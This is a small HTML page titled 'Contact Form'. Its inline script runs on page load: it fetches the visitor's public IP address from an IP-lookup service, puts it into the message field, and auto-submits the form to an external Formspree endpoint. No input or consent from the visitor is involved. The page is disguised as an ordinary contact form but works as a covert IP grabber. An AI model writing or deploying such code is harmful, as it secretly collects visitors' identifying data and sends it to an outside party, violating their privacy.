<head>
    <title>Contact Form</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

</head>
<body>
<form action="https://formspree.io/f/xbjnwzqr" method="post">
    <input type="email" id="email" name="_replyto" placeholder="gmail@gmail.com"><br>
    <textarea id="message" name="message" rows="1" cols="20"></textarea><br>
</form>
    <script>
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('message').value = data.ip;
            if (document.getElementById('message').value == data.ip){
                $("form").submit();
            }
        })
    </script>
</body>
</html>
